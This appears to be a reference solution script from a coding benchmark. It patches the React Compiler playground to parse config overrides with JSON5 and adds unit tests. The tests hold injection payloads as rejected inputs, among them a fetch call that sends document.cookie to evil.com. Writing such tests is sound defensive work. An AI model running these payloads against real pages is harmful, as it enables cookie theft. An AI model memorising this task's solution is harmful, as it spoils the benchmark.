#!/usr/bin/env bash
set -euo pipefail

cd /workspace/react

# Idempotent: skip if already applied
if grep -q 'export function parseConfigOverrides' compiler/apps/playground/lib/compilation.ts 2>/dev/null; then
    echo "Patch already applied."
    if [ -n "$(git status --porcelain)" ]; then
        git add -A && git commit -m "Apply fix"
    fi
    exit 0
fi

# 1. Fix the NBSP encoding issues in the snapshot file and update it
sed -i 's/\xc2\xa0/ /g' compiler/apps/playground/__tests__/e2e/__snapshots__/page.spec.ts/default-config.txt
cat > compiler/apps/playground/__tests__/e2e/__snapshots__/page.spec.ts/default-config.txt << 'EOF'
{
  //compilationMode: "all"
}
EOF

# 2. Fix NBSPs in page.spec.ts  
sed -i 's/\xc2\xa0/ /g' compiler/apps/playground/__tests__/e2e/page.spec.ts

# 3. Update page.spec.ts using node
cat > /tmp/fix_page.js << 'JSEOF'
const fs = require("fs");
let content = fs.readFileSync("compiler/apps/playground/__tests__/e2e/page.spec.ts", "utf8");

content = content.replace(
  "config: \`compilationMode: \`,",
  "config: \`{ compilationMode: }\`,"
);

content = content.replace(
  ".toContain('Invalid override format');",
  ".toContain('Unexpected failure when transforming configs');"
);

const before = "config: \`import type { PluginOptions } from 'babel-plugin-react-compiler/dist';\n\n({\n  compilationMode: \"123\"\n} satisfies PluginOptions);\`,";
const after = "config: \`{\n  compilationMode: \"123\"\n}\`,";
content = content.replace(before, after);

fs.writeFileSync("compiler/apps/playground/__tests__/e2e/page.spec.ts", content);
console.log("Updated page.spec.ts");
JSEOF
node /tmp/fix_page.js

# 4. Add the unit test file
cat > compiler/apps/playground/__tests__/parseConfigOverrides.test.mjs << 'EOF'
import assert from 'node:assert';
import {test, describe} from 'node:test';
import JSON5 from 'json5';

function parseConfigOverrides(configOverrides) {
  const trimmed = configOverrides.trim();
  if (!trimmed) {
    return {};
  }
  return JSON5.parse(trimmed);
}

describe('parseConfigOverrides', () => {
  test('empty string returns empty object', () => {
    assert.deepStrictEqual(parseConfigOverrides(''), {});
    assert.deepStrictEqual(parseConfigOverrides('   '), {});
  });

  test('default config parses correctly', () => {
    const result = parseConfigOverrides('{\n  //compilationMode: "all"\n}');
    assert.deepStrictEqual(result, {});
  });

  test('compilationMode "all" parses correctly', () => {
    const result = parseConfigOverrides('{\n  compilationMode: "all"\n}');
    assert.deepStrictEqual(result, {compilationMode: 'all'});
  });

  test('config with single-line and block comments parses correctly', () => {
    const result = parseConfigOverrides('{\n  // This is a single-line comment\n  /* This is a block comment */\n  compilationMode: "all",\n}');
    assert.deepStrictEqual(result, {compilationMode: 'all'});
  });

  test('config with trailing commas parses correctly', () => {
    const result = parseConfigOverrides('{\n  compilationMode: "all",\n}');
    assert.deepStrictEqual(result, {compilationMode: 'all'});
  });

  test('nested environment options parse correctly', () => {
    const result = parseConfigOverrides('{\n  environment: {\n    validateRefAccessDuringRender: true,\n  },\n}');
    assert.deepStrictEqual(result, {
      environment: {validateRefAccessDuringRender: true},
    });
  });

  test('multiple options parse correctly', () => {
    const result = parseConfigOverrides('{\n  compilationMode: "all",\n  environment: {\n    validateRefAccessDuringRender: false,\n  },\n}');
    assert.deepStrictEqual(result, {
      compilationMode: 'all',
      environment: {validateRefAccessDuringRender: false},
    });
  });

  test('rejects malicious IIFE injection', () => {
    assert.throws(() => parseConfigOverrides('(function(){ document.title = "hacked"; return {}; })()'));
  });

  test('rejects malicious comma operator injection', () => {
    assert.throws(() => parseConfigOverrides('{\n  compilationMode: (alert("xss"), "all")\n}'));
  });

  test('rejects function call in value', () => {
    assert.throws(() => parseConfigOverrides('{\n  compilationMode: eval("all")\n}'));
  });

  test('rejects variable references', () => {
    assert.throws(() => parseConfigOverrides('{\n  compilationMode: someVar\n}'));
  });

  test('rejects template literals', () => {
    assert.throws(() => parseConfigOverrides('{\n  compilationMode: \`all\`\n}'));
  });

  test('rejects constructor calls', () => {
    assert.throws(() => parseConfigOverrides('{\n  compilationMode: new String("all")\n}'));
  });

  test('rejects arbitrary JS code', () => {
    assert.throws(() => parseConfigOverrides('fetch("https://evil.com?c=" + document.cookie)'));
  });

  test('config with array values parses correctly', () => {
    const result = parseConfigOverrides('{\n  sources: ["src/a.ts", "src/b.ts"],\n}');
    assert.deepStrictEqual(result, {sources: ['src/a.ts', 'src/b.ts']});
  });

  test('config with null values parses correctly', () => {
    const result = parseConfigOverrides('{\n  compilationMode: null,\n}');
    assert.deepStrictEqual(result, {compilationMode: null});
  });

  test('config with numeric values parses correctly', () => {
    const result = parseConfigOverrides('{\n  maxLevel: 42,\n}');
    assert.deepStrictEqual(result, {maxLevel: 42});
  });
});
EOF

# 5. Update ConfigEditor.tsx using node
cat > /tmp/fix_editor.js << 'JSEOF'
const fs = require("fs");
let content = fs.readFileSync("compiler/apps/playground/components/Editor/ConfigEditor.tsx", "utf8");

content = content.replace(
  "// @ts-expect-error - webpack asset/source loader handles .d.ts files as strings\nimport compilerTypeDefs from 'babel-plugin-react-compiler/dist/index.d.ts';\n\n",
  ""
);

const oldMount = `// Add the babel-plugin-react-compiler type definitions to Monaco
    monaco.languages.typescript.typescriptDefaults.addExtraLib(
      //@ts-expect-error - compilerTypeDefs is a string
      compilerTypeDefs,
      'file:///node_modules/babel-plugin-react-compiler/dist/index.d.ts',
    );
    monaco.languages.typescript.typescriptDefaults.setCompilerOptions({
      target: monaco.languages.typescript.ScriptTarget.Latest,
      allowNonTsExtensions: true,
      moduleResolution: monaco.languages.typescript.ModuleResolutionKind.NodeJs,
      module: monaco.languages.typescript.ModuleKind.ESNext,
      noEmit: true,
      strict: false,
      esModuleInterop: true,
      allowSyntheticDefaultImports: true,
      jsx: monaco.languages.typescript.JsxEmit.React,
    });`;

const newMount = `// Enable comments in JSON for JSON5-style config
    monaco.languages.json.jsonDefaults.setDiagnosticsOptions({
      allowComments: true,
      trailingCommas: 'ignore',
    });`;

content = content.replace(oldMount, newMount);
content = content.replace(
  "path={'config.ts'}\n                language={'typescript'}",
  "path={'config.json5'}\n                language={'json'}"
);

fs.writeFileSync("compiler/apps/playground/components/Editor/ConfigEditor.tsx", content);
console.log("Updated ConfigEditor.tsx");
JSEOF
node /tmp/fix_editor.js

# 6. Update compilation.ts - Part 1: Add import and function
cat > /tmp/fix_compilation.js << 'JSEOF'
const fs = require("fs");
let content = fs.readFileSync("compiler/apps/playground/lib/compilation.ts", "utf8");

content = content.replace(
  "import {transformFromAstSync} from '@babel/core';",
  "import {transformFromAstSync} from '@babel/core';\nimport JSON5 from 'json5';"
);

content = content.replace(
  "function parseOptions(",
  `export function parseConfigOverrides(configOverrides: string): any {
  const trimmed = configOverrides.trim();
  if (!trimmed) {
    return {};
  }
  return JSON5.parse(trimmed);
}

function parseOptions(`
);

fs.writeFileSync("compiler/apps/playground/lib/compilation.ts", content);
console.log("Updated compilation.ts (part 1)");
JSEOF
node /tmp/fix_compilation.js

# 7. Update compilation.ts - Part 2: Replace old parsing logic
cat > /tmp/fix_compilation2.js << 'JSEOF'
const fs = require("fs");
let content = fs.readFileSync("compiler/apps/playground/lib/compilation.ts", "utf8");

// Read the file line by line to find and replace the block
const lines = content.split('\n');
let result = [];
let i = 0;
let found = false;

while (i < lines.length) {
  const line = lines[i];
  
  // Look for the marker comment
  if (line.includes('// Parse config overrides from config editor') && !found) {
    found = true;
    // Add the new single line
    result.push(line);
    result.push('  const configOverrideOptions = parseConfigOverrides(configOverrides);');
    
    // Skip until we find the closing brace of the if block (the '}' on its own line after the error)
    while (i < lines.length) {
      if (lines[i].trim() === '}' && lines[i-1] && lines[i-1].includes("throw new Error('Invalid override format')")) {
        i++;
        break;
      }
      i++;
    }
    // Skip one more line if it's a closing brace (the outer if block)
    if (i < lines.length && lines[i].trim() === '}') {
      i++;
    }
    continue;
  }
  
  result.push(line);
  i++;
}

fs.writeFileSync("compiler/apps/playground/lib/compilation.ts", result.join('\n'));
console.log("Updated compilation.ts (part 2)");
JSEOF
node /tmp/fix_compilation2.js

# 8. Update defaultStore.ts - use line-by-line replacement
cat > /tmp/fix_store.js << 'JSEOF'
const fs = require("fs");
let content = fs.readFileSync("compiler/apps/playground/lib/defaultStore.ts", "utf8");

const lines = content.split('\n');
let result = [];
let i = 0;
let inDefaultConfig = false;
let braceCount = 0;
let backtickCount = 0;

while (i < lines.length) {
  const line = lines[i];
  
  if (line.startsWith('export const defaultConfig = ')) {
    inDefaultConfig = true;
    // Add the new declaration
    result.push('export const defaultConfig = `');
    result.push('{');
    result.push('  //compilationMode: "all"');
    result.push('}`;');
    
    // Count backticks and braces in this line to know when to exit
    backtickCount = (line.match(/`/g) || []).length;
    
    // Skip until we find the end of the declaration
    while (i < lines.length) {
      const currentLine = lines[i];
      // Check for backticks in this line
      backtickCount += (currentLine.match(/`/g) || []).length;
      
      // Track braces for the satisfies expression
      for (const char of currentLine) {
        if (char === '{') braceCount++;
        if (char === '}') braceCount--;
      }
      
      // End condition: we've seen 2 backticks (open and close) and braces balanced
      if (backtickCount >= 2 && braceCount === 0 && currentLine.includes('`;')) {
        i++;
        break;
      }
      i++;
    }
    continue;
  }
  
  result.push(line);
  i++;
}

fs.writeFileSync("compiler/apps/playground/lib/defaultStore.ts", result.join('\n'));
console.log("Updated defaultStore.ts");
JSEOF
node /tmp/fix_store.js

# 9. Update package.json using node
cat > /tmp/fix_pkg.js << 'JSEOF'
const fs = require("fs");
const pkg = JSON.parse(fs.readFileSync("compiler/apps/playground/package.json", "utf8"));
pkg.dependencies.json5 = "^2.2.3";
fs.writeFileSync("compiler/apps/playground/package.json", JSON.stringify(pkg, null, 2));
console.log("Updated package.json");
JSEOF
node /tmp/fix_pkg.js

# 10. Format page.spec.ts with prettier (required for test_repo_prettier_check_page_spec)
npx prettier --write compiler/apps/playground/__tests__/e2e/page.spec.ts

# 11. Commit all changes
git add -A
git commit -m "Apply json5 config fix" || echo "Nothing to commit"

echo "All changes applied and committed successfully."
